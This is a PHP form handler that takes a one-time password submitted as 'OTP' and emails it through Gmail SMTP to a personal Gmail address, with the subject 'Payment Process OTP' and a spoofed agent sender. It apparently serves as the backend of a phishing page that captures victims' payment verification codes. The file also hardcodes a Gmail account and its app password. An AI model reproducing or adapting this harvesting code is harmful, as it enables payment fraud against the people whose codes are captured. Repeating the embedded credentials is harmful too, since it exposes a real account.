<?php
// Include PHPMailer classes
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php'; // Ensure the PHPMailer package is loaded

// Ensure the script processes only POST requests
if ($_SERVER['REQUEST_METHOD'] != 'POST') {
    http_response_code(405); // Method Not Allowed
    echo json_encode(["error" => "Invalid request method"]);
    exit;
}else{
    if (empty($_POST['OTP'])) {
        http_response_code(400); // Bad Request
        echo json_encode(["error" => "Missing field: OTP"]);
        exit;
    }
    
    // Extract and sanitize inputs
    $otp = htmlspecialchars($_POST['OTP'], ENT_QUOTES, 'UTF-8');
    $to = 'habeebajani9@gmail.com'; // Recipient email address
    $subject = 'Payment Process OTP';
    $name = 'Agent'; // Sender's name
    $fromEmail = 'agent@americaresides.com'; // Sender's email address
    
    // Prepare email content
    $emailBody = "You have received a new message.\n\nOTP: $otp\n";
    $htmlBody = "<h3>You have received a new message.</h3>
        <p><strong>OTP:</strong> $otp</p>";
    
    $mail = new PHPMailer(true);
    
    try {
        // SMTP Server Configuration
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com'; // Gmail's SMTP server
        $mail->SMTPAuth = true;
        $mail->Username = 'habeebajani9@gmail.com'; // Your Gmail address
        $mail->Password = 'kznc uzhe jtce ywhv'; // App-specific password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS; // Enable SSL encryption
        $mail->Port = 465; // Gmail SMTP port
    
        // Email Headers
        $mail->setFrom($fromEmail, $name); // Sender's email and name
        $mail->addAddress($to, 'Resido'); // Recipient's email and name
    
        // Email Content
        $mail->isHTML(true);
        $mail->Subject = $subject;
        $mail->Body = $htmlBody;
    
        // Send the email
       // Send the email
       if($mail->send()){
            echo "success";
        }else{
            echo "error";
        }
    } catch (Exception $e) {
        http_response_code(500); // Internal Server Error
        echo json_encode(["error" => "Message could not be sent. Mailer Error: {$mail->ErrorInfo}"]);
    }
    
    exit;
    
}



// Validate JSON decoding

// Check if OTP is provided
